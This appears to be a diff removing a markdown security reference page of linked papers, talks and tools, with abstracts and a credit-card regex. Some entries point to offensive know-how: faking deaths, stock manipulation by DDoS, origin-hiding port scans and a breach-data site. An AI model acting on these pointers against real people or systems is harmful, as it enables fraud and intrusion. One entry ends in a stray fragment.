-* [The Eavesdropper’s Dillemma](http://www.crypto.com/papers/internet-tap.pdf)
-* [Mov is turing ocmplete](http://www.cl.cam.ac.uk/~sd601/papers/mov.pdf)
-* [Towards Optimization-Safe Systems: Analyzing the Impact of Undefined Behavior](http://pdos.csail.mit.edu/~xi/papers/stack-sosp13.pdf)
-	* This paper studies an emerging class of software bugs called optimization-unstable code: code that is unexpectedly discarded by compiler optimizations due to undefined behavior in the program. Unstable code is present in many systems, including the Linux kernel and the Postgres database. The consequences of unstable code range from incorrect functionality to missing security checks. To reason about unstable code, this paper proposes a novel model, which views unstable code in terms of optimizations that leverage undefined behavior. Using this model, we introduce a new static checker called Stack that precisely identifies unstable code. Applying Stack to widely used systems has uncovered 160 new bugs that have been confirmed and fixed by developers
-* [Annoyances Caused by Unsafe Assumptions](http://uninformed.org/?v=all&a=5&t=sumry)
-	* This installation of What Were They Thinking illustrates some of the annoyances that can be caused when developing software that has to inter-operate with third-party applications. Two such cases will be dissected and discussed in detail for the purpose of showing how third-party applications can fail when used in conjunction with software that performs certain tasks. The analysis of the two cases is meant to show how complex failure conditions can be analyzed and used to determine inter-operability problems. 
-* [Reflections on Trusting Trust](https://www.ece.cmu.edu/~ganger/712.fall02/papers/p761-thompson.pdf)
-* [Ceremony Design and Analysis](http://eprint.iacr.org/2007/399.pdf)
-	* Abstract: The concept of Ceremony is introduced as an extension of the concept of network protocol, with human nodes alongside computer nodes and with communication links that include UI, human-to-human communication and transfers of physical objects that carry data. What is out-of-band to a protocol is in-band to a ceremony, and therefore subject to design and analysis using variants of the same mature techniques used for the design and analysis of protocols. Ceremonies include all protocols, as well as all applications with a user interface, all workflow and all provisioning scenarios. A secure ceremony is secure against both normal attacks and social engineering. However, some secure protocols imply ceremonies that cannot be made secure. 
-
-
-Informational
-* [Manuals Library](https://www.manualslib.com/)
-* [IA Guidance - NSA](https://www.iad.gov/iad/library/ia-guidance/index.cfm)
-* [Structured Text Tools](https://github.com/dbohdan/structured-text-tools)
-	* A list of command line tools for manipulating structured text data
-* [What happens when…](https://github.com/alex/what-happens-when)
-	* An attempt to answer the age old interview question "What happens when you type google.com into your browser and press enter?" 
-* [Shakespeare in the Bush An American anthropologist set out to study the Tiv of West Africa and was taught the true meaning of Hamlet.](http://www.naturalhistorymag.com/picks-from-the-past/12476/shakespeare-in-the-bush)
-* [China’s Great Cannon](https://citizenlab.org/2015/04/chinas-great-cannon/) 
-	* This post describes our analysis of China’s “Great Cannon,” our term for an attack tool that we identify as separate from, but co-located with, the Great Firewall of China. The first known usage of the Great Cannon is in the recent large-scale novel DDoS attack on both GitHub and servers used by GreatFire.org.
-
-
-Informational(non-serious-kinda)
-* [Encyclopedia of things considered harmful](http://harmful.cat-v.org/)
-* [“Considered Harmful” Essays Considered Harmful](http://meyerweb.com/eric/comment/chech.html)
-
-
-
-Internet
-* [chipmachine](https://github.com/sasq64/chipmachine)
-* [Wars Within](http://uninformed.org/?v=all&a=26&t=sumry)
-	* In this paper I will uncover the information exchange of what may be classified as one of the highest money making schemes coordinated by 'organized crime'. I will elaborate on information gathered from a third party individual directly involved in all aspects of the scheme at play. I will provide a detailed explanation of this market's origin, followed by a brief description of some of the actions strategically performed by these individuals in order to ensure their success. Finally, I will elaborate on real world examples of how a single person can be labeled a spammer, malware author, cracker, and an entrepreneur gone thief. For the purposes of avoiding any legal matters, and unwanted media, I will refrain from mentioning the names of any individuals and corporations who are involved in the schemes described in this paper. 
-* [Seven Months’ Worth of Mistakes: A Longitudinal Study of Typosquatting Abuse](https://lirias.kuleuven.be/bitstream/123456789/471369/3/typos-final.pdf)
-	* Abstract: Typosquatting is the act of purposefully registering a domain name that is a mistype of a popular domain name. It is a concept that has been known and studied for over 15 years, yet still thoroughly practiced up until this day. While previous typosquatting studies have always taken a snapshot of the typosquatting landscape or base their longitudinal results only on domain registration data, we present the first content- based , longitudinal study of typosquatting. We collected data about the typosquatting domains of the 500 most popular sites of the Internet every day, for a period of seven months, and we use this data to establish whether previously discovered typosquatting trends still hold today, and to provide new results and insights in the typosquatting landscape. In particular we reveal that, even though 95% of the popular domains we investigated are actively targeted by typosquatters, only few trademark owners protect themselves against this practice by proactively registering their own typosquatting domains. We take advantage of the longitudinal aspect of our study to show, among other results, that typosquatting domains change hands from typosquatters to legitimate owners and vice versa, and that typosquatters vary their monetization strategy by hosting different types of pages over time. Our study also reveals that a large fraction of typosquatting domains can be traced back to a small group of typosquatting page hosters and that certain top-level domains are much more prone to typosquatting than others
-
-
-News
-* [U.S. Department of Health and Human Services Office for Civil Rights Breach Portal: Notice to the Secretary of HHS Breach of Unsecured Protected Health Information](https://ocrportal.hhs.gov/ocr/breach/breach_report.jsf)
-* [Medical Device Law: Compliance Issues, Best Practices and Trends - American Bar Association](https://www.americanbar.org/content/dam/aba/events/cle/2015/10/ce1510mdm/ce1510mdm_interactive.authcheckdam.pdf)
-* [LeakedSource.ru](https://leakedsource.ru/)
-
-
-
-
-Political
-* [Drone Survival Guide](http://dronesurvivalguide.org)
-* [They clapped](http://www.econlib.org/library/Columns/y2007/Mungergouging.html)
-* [NSA's Legal Authorities](http://electrospaces.blogspot.com/2015/09/nsas-legal-authorities.html)
-
-
-
-Random
-* [what3words](https://what3words.com/about/)
-	* what3words provides a precise and incredibly simple way to talk about location. We have divided the world into a grid of 3m x 3m squares and assigned each one a unique 3 word address.
-
-
-Side Channel Attacks
-* [A Practical Methodology for Measuring the Side-Channel Signal Available to the Attacker for Instruction-Level Event](http://users.ece.gatech.edu/~az30/Downloads/Micro14.pdf)
-	* Abstract: This paper presents a new metric, which we call Signal Available to Attacker (SAVAT), that measures the side channel signal created by a specific single-instruction difference in program execution, i.e. the amount of signal made available to a potential attacker who wishes to decide whether the program has executed instruction/event A or instruction/event B. We also devise a practical methodology for measuring SAVAT in real systems using only user-level access permissions and common measurement equipment. Finally, we perform a case study where we measure electromagnetic (EM) emanations SAVAT among 11 different instructions for three different laptop systems. Our findings from these experiments confirm key intuitive expectations, e.g. that SAVAT between on-chip instructions and off-chip memory accesses tends to be higher than between two on-chip instructions. However, we find that particular instructions, such as integer divide, have much higher SAVAT than other instructions in the same general category (integer arithmetic), and that last-level-cache hits and misses have similar (high) SAVAT. Overall, we confirm that our new metric and methodology can help discover the most vulnerable aspects of a processor architecture or a program, and thus inform decision-making about how to best manage the overall side channel vulnerability of a processor, a program, or a system.
-* [Palinopsia - Is your VirtualBox reading your E-Mail? Reconstruction of FrameBuffers from VRAM](https://hsmr.cc/palinopsia/)
-
-Services
-
-
-Timelines
-* [Timeline/List of low-level attacks/persistence techniques.  HIGHLY RECOMMENDED!](http://timeglider.com/timeline/5ca2daa6078caaf4)
-* [Timeline of Software/Timing Attestation papers](http://timeglider.com/timeline/be11d685a7c4374d)
-* [Internet Timeline](https://www.zakon.org/robert/internet/timeline/)
-
-
-
-
-
-
---------
-##### Regex for credit cards
-* [Link](http://www.regular-expressions.info/creditcard.html)
-* ^(?:4[0-9]{12}(?:[0-9]{3})?          # Visa
-* |  5[1-5][0-9]{14}                  # MasterCard
-* |  3[47][0-9]{13}                   # American Express
-* |  3(?:0[0-5]|[68][0-9])[0-9]{11}   # Diners Club
-* |  6(?:011|5[0-9]{2})[0-9]{12}      # Discover
-* |  (?:2131|1800|35\d{3})\d{11}      # JCB
-*)$
-
-
-
-
--------------
-### <a name="talks"></a>Interesting Talks/Videos
-* [You and Your Research - Haroon Meer](https://www.youtube.com/watch?v=JoVx_-bM8Tg)
-	* What does it take to do quality research? What stops you from being a one-hit wonder? Is there an age limit to productive hackery? What are the key ingredients needed and how can you up your chances of doing great work? In a talk unabashedly stolen from far greater minds we hope to answer these questions and discuss their repercussions.
-* [Bootstrapping A Security Research Project Andrew Hay](https://www.youtube.com/watch?v=gNU2J-IcK4E)
-	* It has become increasingly common to see a headline in the mainstream media talking about the latest car, television, or other IoT device being hacked (hopefully by a researcher). In each report, blog, or presentation, we learn about the alarming lack of security and privacy associated with the device's hardware, communications mechanisms, software/app, and hosting infrastructure in addition to how easy it might be for an attacker to take advantage of one, or multiple, threat vectors. The truth is, anyone can perform this kind of research if given the right guidance. To many security professionals, however, the act of researching something isn,t the problem...it's what to research, how to start, and when to stop. Academics think nothing of researching something until they feel it's "done" (or their funding/tenure runs out). Security professionals, however, often do not have that luxury. This session will discuss how to research, well, ANYTHING. Proven methods for starting, continuing, ending, leading, and collaborating on reproducible research will be discussed - taking into account real-world constraints such as time, money, and a personal life. We will also discuss how to generate data, design your experiments, analyze your results, and present (and in some cases defend) your research to the public.
-* [A talk about (info-sec) talks - Haroon Meer ](https://www.youtube.com/watch?v=BlVjdUkrSFY)
-	* Last year there was an Information Security conference taking place for almost every day of the year. This translates to about 15 information security talks per day, every day. The question is, is this a bad thing? Even niche areas of the info-sec landscape have their own dedicated conference these days. Is this a good thing?
-* [Take Charge of Your Infosec Career! - Glen Roberts - BSidesSLC2015](https://www.youtube.com/watch?v=QqlnB2FeODo)
-	* You spent $5,000, a plane trip, a hotel and a full workweek on your last infosec course but when was the last time you invested even just a few hours of your time exclusively to developing your infosec career in a truly meaningful way? This talk will challenge the way you view your career and give you actionable steps for taking charge of it so you can optimize the rewards and fulfillment you receive from your work. Glen will leverage the stories and best practices from dozens of information security professionals to help inspire your infosec career journey. This presentation will be engaging and speak to the soul in a way that instills ownership of your own career and generates a passion for finding and carving out your own authentic career path.
-* [Con Video Rig Enhancements - IronGeek & SkyDog](https://www.youtube.com/watch?v=BVCFAqLxdtY)
-
-Attacking/PenTester/RedTeam
-* [I Will Kill You - Chris Rock](https://www.youtube.com/watch?feature=youtu.be&v=9FdHq3WfJgs&t=77&app=desktop)
-	* Have you ever wanted to kill someone? Do you want to get rid of your partner, your boss or your arch nemesis? Perhaps you want to enjoy your life insurance payout whilst you’re still alive. Do you have rich elderly parents that just won’t die quick enough? Or do you want a “Do Over” new identity.  Then, this presentation is for you! I’ll provide you with the insight and techniques on how to “kill” someone and obtain a real death certificate and shutdown their lives. It focuses on the lack of security controls that allow any of us to virtually kill off anyone or any number of people. Forget the Dexter way of killing someone, I’ll show you how to avoid the messy clean up and focusing in on the digital aspects. You could be dead right now and not even know it.
-* [Kim Jong-il and Me: How to Build a Cyber Army to Defeat the U.S. - Charlie MIller](https://www.youtube.com/watch?v=4up0yTGlpaU)
-* [Evaluating the APT Armor - Matthias Luft, Felix Wilhelm](https://www.youtube.com/watch?v=3vh2s9Pui0E)
-* [How to Hack All the Transport Networks of a Country - Defcon20](https://www.youtube.com/watch?v=D6KEhdHFc9I)
-* [How to safely conduct shenanigans EvilMog Renderman - Derbycon7](https://www.youtube.com/watch?v=Ca0DA9Dq1IA&index=61&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-* [If it fits - it sniffs: Adventures in WarShipping](http://www.irongeek.com/i.php?page=videos/derbycon4/t104-if-it-fits-it-sniffs-adventures-in-warshipping-larry-pesce)
-
-
-Educational
-* [Con Video Rig Enhancements - IronGeek & SkyDog](https://www.youtube.com/watch?v=BVCFAqLxdtY)
-* [How to Become an InfoSec Autodidact - Kelly Shortridge - Duo Tech Talk](https://www.youtube.com/watch?v=h92vmwg9Tyc)
-* [Volatile Memory: Behavioral Game Theory in Defensive Security](https://www.slideshare.net/kshortridge/volatile-memory-behavioral-game-theory-in-defensive-security)
-* [The Art of Explanation: Behavioral Models of InfoSec - Kelly Shortridge](https://www.youtube.com/embed/UdZDlt2dlqM?)
-* [301 The Road to Hiring is Paved in Good Intentions Tim OBrien](https://www.youtube.com/watch?v=sdkf8SIj1rU)
-* [Ermahgerd: Lawrs - Robert Heverly - Anycon17](http://www.irongeek.com/i.php?page=videos/anycon2017/305-ermahgerd-lawrs-prof-robert-heverly)
-	* When do you, and other coders, hackers, developers, and tinkerers, think or worry about the law? If your answer is, ?Not very often,? then this talk is for you. We all need to think about the law. And it's not just privacy, or computer fraud, or even anti-circumvention law, that we should think about. We need to think about law as a whole and how it can help us do or stop us from doing what we want to do. This talk will start with a broad overview of the ways in which we implicate law when we do what we do, and then will focus on what that means for us and the broader implications that can arise from our various activities. Do you think the law would stop you from doing what you want to do or punish you for doing it? It might, but it also might not. If you think it does, do you think you should be able to do what you want to do? If you do, then we need to hack the law, and to do that we?ll need to talk to the legal coders, those writers of our cultural software. This talk will tackle not only law and working with code, but also why it matters for us to be aware of the law and engaged in improving it.
-* [The Impact of Dark Knowledge and Secrets on Security and Intelligence Professionals - Richard Thieme](https://www.youtube.com/watch?v=0MzcPBAj88A&list=PLuUtcRxSUZUpv2An-RNhjuZSJ5fjY7ghe)
-	* Dismissing or laughing off concerns about what it does to a person to know critical secrets does not lessen the impact on life, work, and relationships of building a different map of reality than “normal people” use. One has to calibrate narratives to what another believes. One has to live defensively, warily. This causes at the least cognitive dissonance which some manage by denial. But refusing to feel the pain does not make it go away. It just intensifies the consequences when they erupt. Philip K. Dick said, reality is that which, when you no longer believe in it, does not go away. When cognitive dissonance evolves into symptoms of traumatic stress, one ignores those symptoms at one’s peril. But the very constraints of one’s work often make it impossible to speak aloud about those symptoms, because that might threaten one’s clearances, work, and career. And whistle blower protection is often non-existent.
-* [Weapons of Mass Distraction](http://conference.hitb.org/hitbsecconf2014kul/materials/D2T1%20-%20Haroon%20Meer%20Azhar%20Desai%20and%20Marco%20Slaviero%20-%20Weapons%20of%20Mass%20Distraction.pdf)
-	* In this talk, we aim to briefly cover the background of sock puppets (and related attacks) before moving on to real world demonstrations & “attacks“. Rigging polls, abusing Twitter, causing Reddit riots & targeting popular news organisations are some of the (many) attacks covered. In all these cases we discuss what we tried, what worked, what didn’t and what the implications are of the attacks. Where possible we will cover defences and solutions.
-* [Youre stealing it wrong 30 years of inter pirate battles - Jason Scott - Defcon 18](https://www.youtube.com/watch?v=a5AceLYWE1Q&app=desktop)
-* [[TROOPERS15] Andreas Lindh - Defender Economics](https://www.youtube.com/watch?v=mAP38Xy52X0)
-
-
-Genuinely Interesting/Unusual
-* [Achilles Heel of the American Banking System](http://www.irongeek.com/i.php?page=videos/derbycon4/the-achilles-heel-of-the-banking-system)
-* [You're Leaking Trade Secrets - Defcon22 Michael Schrenk](https://www.youtube.com/watch?v=JTd5TL6_zgY)
-	* Networks don't need to be hacked for information to be compromised. This is particularly true for organizations that are trying to keep trade secrets. While we hear a lot about personal privacy, little is said in regard to organizational privacy. Organizations, in fact, leak information at a much greater rate than individuals, and usually do so with little fanfare. There are greater consequences for organizations when information is leaked because the secrets often fall into the hands of competitors. This talk uses a variety of real world examples to show how trade secrets are leaked online, and how organizational privacy is compromised by seemingly innocent use of The Internet.
-* [Exploiting Network Surveillance Cameras Like a Hollywood Hacker - Black Hat 2013](https://www.youtube.com/watch?v=B8DjTcANBx0)
-* [Paypals War on Terror - Chaos Communication Congress 31](http://ccc2.mirror.xt0.org/congress/2014/webm-hd/31c3-6377-en-de-Paypals_War_on_Terror_webm-hd.webm)
-* [CompSci in the DPRK](http://us2.1und1.c3voc.de/congress/2014/webm-hd/31c3-6253-en-de-Computer_Science_in_the_DPRK_webm-hd.webm)
-* [Disrupting an Adware-serving Skype Botnet](http://phishme.com/disrupting-an-adware-serving-skype-botnet/)
-	* Not crazy technical or anything, moreso an interesting tale that shows one person with a little bit of skill can disrupt malvertising campaigns with a little legwork.
-* [Software Supply Chains and the Illusion of Control - Derek Weeks](http://www.irongeek.com/i.php?page=videos/bsidesnova2017/107-software-supply-chains-and-the-illusion-of-control-derek-weeks)
-	* In this presentation I am sharing the results of a three-year, industry-wide study on open source development and security practices across 3,000 organizations and 25,000. I will detail how these organizations are employing a vast community of open source component suppliers, warehouses, and development tools that take the form of software supply chains. Modern software development practices are now consuming BILLIONS of open source and third-party components. The tooling with package managers and build tools such as Maven, Gradle, npm, NuGet, RubyGems and others has promoted the usage of components to a convenient standard practice. As a result, 90% of a typical application is now composed of open source components. The good news: use of the components is improving developer productivity and accelerating time to market. However, using these components brings ownership and responsibility with it and this fact is largely overlooked. The unspoken truth: not all parts are created equal. For example, 1 in 16 components in use include known security vulnerabilities. Ugh. This session aims to enlighten development professionals by sharing results from the State of the Software Supply Chain reports from 2015 through 2017. The reports blend of public and proprietary data with expert research and analysis. Attendees in this session will learn: - What our analysis of 25,000 applications reveals about the quality and security of software built with open source components - How organizations like Mayo Clinic, Exxon, Capital One, the U.S. FDA and Intuit are utilizing the principles of software supply chain automation to improve application security - Why avoiding open source components over 3 years old might be a really good idea - How to balance the need for speed with quality and security -- early in the development lifecycle We will also discuss how you can best approach the effort for development teams to identify, track and replace components with known vulnerabilities, while getting more products and new features to market quickly. Attend this session and gain insight as to how your organization’s application development practices compare to others. I'll share the industry benchmarks to take back and discuss with your development, security, and open source governance teams.
-* [Hacks, Lies, & Nation States - Mario DiNatale - ANYCON 2017](http://www.irongeek.com/i.php?page=videos/anycon2017/303-hacks-lies-nation-states-mario-dinatale)
-	* A hilarious and non-technical skewering of the current state of Cybersecurity, the Cybersecurity
-* [Money Makes Money: How To Buy An ATM And What You Can Do With It by Leigh Ann Galloway - BSides Manchester2017](https://www.youtube.com/watch?v=0HbLQAGS6no&index=8&list=PLcgqQkap1lNrOBNCXqpPqpPAqckxv0XhP)
-* [(In)Outsider Trading – Hacking stocks using public information and (influence) - Robert Len - BSides CapeTown16](https://www.youtube.com/watch?v=sfHeguTEkuE)
-	* This talk will take a look at how inadvertently leaked technical information from businesses, can be used to successfully trade stocks. This results in making huge profits. We look at different methods of influencing the stock market, such as DDOS attacks (at critical time periods) and simple techniques such as Phish-baiting CEO’s to acquire sensitive, relevant information that can be applied in the real world to make massive gains in profit. We will also take a look at historic trends. How previous hacks, breaches and DDOS attacks have affected stock prices and investor confidence over time. Specific reference will be made towards listed South African companies (Or a particular listed SA company) and a POC will hopefully be completed by the presentation date. 
-* [Pwning pwners like a n00b](https://www.youtube.com/watch?v=E8O8bB3I3i0)
-	* Cybercrime, blackhat hackers and some Ukrainians. If that doesn’t catch your attention, then stop reading. Follow the story of how stupid mistakes, OPSEC fails, and someone with a little too much time on his hands was able to completely dismantle a spamming and webshell enterprise using really simple skills and techniques you could pick up in a week. Did we mention that d0x were had as well? This talk will be an in-depth examination at the investigation and exploitation process involved. 
-* [Human Trafficking in the Digital Age](https://www.irongeek.com/i.php?page=videos/derbycon4/t516-human-trafficking-in-the-digital-age-chris-jenks)
-
-
-Insider Threats
-* [Combating the Insider Threat at the FBI: Real World Lessons Learned - BlackHat2013](https://www.youtube.com/watch?v=0stTS-G5FsE)
-
-
-
-Policy
-* [Just What The Doctor Ordered? - Scott Erven and Shawn Merdinger - DEF CON 22](https://www.youtube.com/watch?v=wTEMSBXtkAc)
-	* This discussion will also highlight the fallout from security standards not being a requirement for medical device manufacturers, and our experience in identifying and reporting vulnerabilities. We will provide our insight into what needs to be done for healthcare organizations to respond to the new threat of cyber-attack against medical devices. We are working towards a future where cyber security issues in medical devices are a thing of the past. We will discuss the recent success and traction we have gained with healthcare organizations, federal agencies and device manufacturers in addressing these security issues. The train is now moving, so please join us to find out how you can get involved and make a difference by ensuring patient safety.
-* [Psychology of Security - Stefan Schumacher - Trooper14](https://www.youtube.com/watch?v=vZKAi4RAIvA)
-	* In this talk I will introduce the Institute’s research programme about the Psychology of Security. We are going to research the psychological basics of IT security, including: How do people experience IT security? How are they motivated? How do they learn? Why do people tend to make the same mistakes again and again (Buffer Overflow, anyone?)? What can we do to prevent security incidents? Which curricula should be taught about IT security?
-* [Killing you softly Josh Bressers](http://www.irongeek.com/i.php?page=videos/circlecitycon2016/302-killing-you-softly-josh-bressers)
-	* The entire security industry has a serious skill problem. We,re technically able, but we have no soft skills. We can,t talk to normal people at all. We can barely even talk to each other, and it's killing our industry. Every successful industry relies on the transfer of skills from the experienced to the inexperienced. Security lacks this today. If I asked you how you learned what you know about security, what would your answer be? In most cases you learned everything you know on your own. There was minimal learning from someone else. This has left us with an industry full of magicians, but even worse it puts us in a place where there is no way to transfer skill and knowledge from one generation to the next. Magicians don,t scale. If we think about this in the context of how we engage non security people it's even worse! Most non security people have no idea what security is, what security does, or even why security is important. It's easy to laugh at the horrible security problems almost everything has today, but in reality we,re laughing at ourselves. Historically we,ve blamed everything else for this problem when in reality it's 100% our fault. One of the our great weaknesses is failing to get the regular people to understand security and why it's important. This isn,t a surprise if you think about how the industry communicates. We can barely talk to each other, how can we possibly talk to someone who doesn,t know anything about security? Normal people are confused and scared, they want to do the right thing but they have no idea what that is. The future leaders in security are going to have to be able to teach and talk to their security peers, but more importantly they will have to engage everyone else. Security is being paid attention to like never before, and yet we have nothing to say to anyone. What has changed in the last few years? If we don,t do our jobs, someone else will do them for us, and we,re not going to like the results. Security isn,t a technical problem, technical problems are easy, security is a communication problem. Communications problems are difficult. Let's figure out how we can fix that.
-* [Bridging the Air Gap: Cross Domain Solutions - Patrick Orzechowski](https://www.irongeek.com/i.php?page=videos/bsideslasvegas2014/pg08-bridging-the-air-gap-cross-domain-solutions-patrick-orzechowski)
-	* For years the government has been using CDS to bridge networks with different classification levels. This talk will focus on what CDS systems are, how they’re built, and what kind of configurations are common in the wild. Furthermore, we’ll look at testing techniques to evaluate the security of these systems and potential ways to exploit holes in configuration and design. We’ll also look at the ways the commercial world might benefit from a data and type-driven firewall as well as some of the downfalls and negative aspects of implementing a cross-domain system. 
-
-
-Political
-* [Coming War on General Computation](https://www.youtube.com/watch?v=HUEvRyemKSg)
-* [Kinetic to Digital Terrorism in the Digital Age Kyle Wilhoit](https://www.youtube.com/watch?v=IsaUuCrjXu4&index=24&list=PLNhlcxQZJSm-PKUZTYe1C94ymf0omysM3)
-* [Beyond Information Warfare: You aint seen nothing yet - Winn Scwartau](http://www.irongeek.com/i.php?page=videos/derbycon3/2206-beyond-information-warfare-you-ain-t-seen-nothing-yet-winn-schwartau)
-* [When the Cops Come A-Knocking: Handling Technical Assistance Demands from Law Enforcement](https://www.youtube.com/watch?v=PX2RjJAfTYg)
-* [New cache architecture on Intel I9 and Skylake server: An initial assessment](https://cyber.wtf/2017/07/18/new-cache-architecture-on-intel-i9-and-skylake-server-an-initial-assessment/)
-* [How They Did It: An Analysis of Emission Defeat Devices in Modern Automobiles](https://www.ieee-security.org/TC/SP2017/papers/101.pdf)
-
-Misc/Didn't Fit above
-* [NSA USB Playset - ShmooCon201](https://www.youtube.com/watch?v=eTDBFpLYcGA)
-* [Code Execution In Spite Of BitLocker](https://cryptoservices.github.io/fde/2014/12/08/code-execution-in-spite-of-bitlocker.html)
-* [Locking Your Registry Keys for Fun and, Well, Just Fun I Guess](https://tyranidslair.blogspot.co.uk/2017/07/locking-your-registry-keys-for-fun-and.html)
-* [If a prefix DROPs, does anyone listen?](http://threatshare.com/2013/05/if-a-prefix-drops-does-anyone-listen/)
-* [Exploiting Android Users for Fun and Profit](http://www.codeword.xyz/2015/08/09/exploiting-android-users-for-fun-and-profit/)
-* [Docker: Not Even a Linker](http://adamierymenko.com/docker-not-even-a-linker/)
-* [Why Qubes doesn’t work on Windows.](http://www.invisiblethingslab.com/resources/2014/A%20crack%20on%20the%20glass.pdf)
-* [A Practical Attack to De-Anonymize Social Network Users](https://www.iseclab.org/papers/sonda-TR.pdf)
-* [Virtual Ghost: Protecting Applications from Hostile Operating Systems](http://sva.cs.illinois.edu/pubs/VirtualGhost-ASPLOS-2014.pdf)
-* [moflow](https://github.com/vrtadmin/moflow)
-	* Release Branches for MoFlow
-* [List of hacker sites](http://link-base.org/)
-
-
-
-### <a name="hwprojects"></a>Interesting Hardware Projects
-* [Digital Ding Dong Ditch](https://github.com/samyk/dingdong)
-	* Digital Ding Dong Ditch is a device to hack into and ring my best friend's wireless doorbell whenever I send a text message to the device. The best part of the device is that it causes my friend, without fail, to come outside, find no one, and go back in. In this project, we'll learn not only how to create this device, but how to reverse engineer radio frequencies we know nothing about using RTL-SDR (a ~$14 software defined radio), as well as creating hardware and software using Arduino, the Adafruit FONA (GSM/SMS/2G board), an RF (radio frequency) transmitter to transmit custom signals, and even how to reverse engineer a proprietary radio signal we know nothing about!
-
-
-
-
-
-
----------------
-### <a name="scrape"></a>Screen Scraping
-
-[I Don’t Need No Stinking API: Web Scraping For Fun and Profit](https://blog.hartleybrody.com/web-scraping/)
-
-[PHP Tutorial 2: Advanced Data Scraping Using cURL And XPATH](http://www.matthewwatts.net/tutorials/php-tutorial-2-advanced-data-scraping-using-curl-and-xpath/)
-
-
-#### Tools
-
-[Scrapy](http://scrapy.org/)
-* An open source and collaborative framework for extracting the data you need from websites. In a fast, simple, yet extensible way. 
-
-[iMacros for Firefox](https://addons.mozilla.org/en-US/firefox/addon/imacros-for-firefox/)
-* Automate Firefox. Record and replay repetitious work. If you love the Firefox web browser, but are tired of repetitive tasks like visiting the same sites every days, filling out forms, and remembering passwords, then iMacros for Firefox is the solution you’ve been dreaming of! ***Whatever you do with Firefox, iMacros can automate it.***
-
-[Scraper - Chrome plugin](https://chrome.google.com/webstore/detail/scraper/mbigbapnjcgaffohmbkdlecaccepngjd)
-* Scraper is a simple data mining extension for Google Chrome™ that is useful for online research when you need to quickly analyze data in spreadsheet form.  To use it: highlight a part of the webpage you'd like to scrape, right-click and choose "Scrape similar...". Anything that's similar to what you highlighted will be rendered in a table ready for export, compatible with Google Docs™.  This is a work-in-progress (i.e. there are bugs), and is currently intended for intermediate to advanced users who are comfortable with XPath, though jQuery is also supported to an extent.
-
-[IRobot](http://irobotsoft.com/)
-* IRobot@IRobotSoft is an intelligent Web automation software. It features a small core that powers everything you need for handling Web data. You can easily teach and create your own robots to automate your daily activities. The robots will click links, submit forms, connect to databases, and run custom code to analyse data.
-
-[OutWit Hub - Shareware](http://www.outwit.com/products/hub/)
-* OutWit Hub breaks down Web pages into their different constituents. Navigating from page to page automatically, it extracts information elements and organizes them into usable collections.
-
-
-
-
-
--------------
-### <a name="simulation"></a>Simulators/ions
-
-[Shadow](http://shadow.github.io/)
-* Summary: Shadow is a unique, open source discrete-event network simulator that runs real applications like Tor. Shadow combines the accuracy of emulation with the efficiency and control of simulation, achieving the best of both approaches 
-
-[Hflow2](https://projects.honeynet.org/hflow)
-* Data Analysis System
-
-[VirtualPlant](http://wroot.org/projects/virtuaplant/)
-* VirtuaPlant is a Industrial Control Systems simulator which adds a “similar to real-world control logic” to the basic “read/write tags” feature of most PLC simulators. Paired with a game library and 2d physics engine, VirtuaPlant is able to present a GUI simulating the “world view” behind the control system allowing the user to have a vision of the would-be actions behind the control systems.strated as the fruits of the bug hunting labour.
-
-
-
----------------------------------
-### <a name="purpose"></a>Various Purpose Based OS's
-* [Parrot Security](https://www.parrotsec.org/)
-* [Qubes](https://www.qubes-os.org/wiki/)
-	* Qubes is an open-source operating system designed to provide strong security for desktop computing using Security by Compartmentalization approach. Qubes is based on Xen, the X Window System, and Linux, and can run most Linux applications and utilize most of the Linux drivers. Qubes Release 1 was released in September 2012 and Release 2 in September 2014. Qubes also supports Windows-based AppVMs beginning with Release 2 (currently in “Beta”). Qubes Release 3 is coming soon and will introduce Hypervisor Abstraction Layer (HAL), allowing easy porting to alternative virtualization systems.
-* [Liberte](http://dee.su/liberte)
-	* Liberté Linux is a secure, reliable, lightweight and easy to use Gentoo-based LiveUSB/SD/CD Linux distribution with the primary purpose of enabling anyone to communicate safely and covertly in hostile environments. Whether you are a privacy advocate, a dissident, or a sleeper agent, you are equally likely to find Liberté Linux useful as a mission-critical communication aid. 
-* [Archassault](https://archassault.org/)
-	* The ArchAssault Project is an Arch Linux derivative for penetration testers, security professionals and all-around Linux enthusiasts. This means we import the vast majority of the official upstream Arch Linux packages, these packages are unmodified from their upstream source. While our Arch Linux base is primarily untouched, there are times were we have to fork a package to be able to better support our vast selection of tools. All of our packages strive to maintain the Arch Linux standards, methods and philosophies.
-* [Kali linux](https://www.kali.org/)
-	* You do pentesting with it.
-* [Tails](https://tails.boum.org/)
-	* Tails is a live operating system, that you can start on almost any computer from a DVD, USB stick, or SD card. It aims at preserving your privacy and anonymity, and helps you to: use the Internet anonymously and circumvent censorship; all connections to the Internet are forced to go through the Tor network; leave no trace on the computer you are using unless you ask it explicitly; use state-of-the-art cryptographic tools to encrypt your files, emails and instant messaging.
-* [PenQ](http://www.qburst.com/products/PenQ)
-	* PenQ is an open source, Linux-based penetration testing browser bundle we built over Mozilla Firefox. It comes pre-configured with security tools for spidering, advanced web searching, fingerprinting, anonymous browsing, web server scanning, fuzzing, report generating and more.
-* [Active Defense Harbinger Distribution (ADHD)](https://www.sourceforge.net/projects/adhd/)
-	* The Active Defense Harbinger Distribution (ADHD) is a Linux distro based on Ubuntu LTS. It comes with many tools aimed at active defense preinstalled and configured. The purpose of this distribution is to aid defenders by giving them tools to "strike back" at the bad guys.  ADHD has tools whose functions range from interfering with the attackers' reconnaissance to compromising the attackers' systems. Innocent bystanders will never notice anything out of the ordinary as the active defense mechanisms are triggered by malicious activity such as network scanning or connecting to restricted services.
-	* [Blogpost going over it/setting it up - HolisticInfosec](http://holisticinfosec.blogspot.com/2013/10/c3cm-part-3-adhd-active-defense.html)
-
-
-
-
-
-
-### <a name="software"></a>Interesting Software
-
-
-Generally Interesting
-
-
-
-* [scanless](https://github.com/vesche/scanless)
-	* Command-line utility for using websites that can perform port scans on your behalf. Useful for early stages of a penetration test or if you'd like to run a port scan on a host and have it not come from your IP address.
-* [Simplevisor](https://ionescu007.github.io/SimpleVisor/)
-	* SimpleVisor is a simple, portable, Intel VT-x hypervisor with two specific goals: using the least amount of assembly code (10 lines), and having the smallest amount of VMX-related code to support dynamic hyperjacking and unhyperjacking (that is, virtualizing the host state from within the host). It runs on both Windows and UEFI.
-
-Data Visualization
-* [ProcDOT](http://www.cert.at/downloads/software/procdot_en.html)
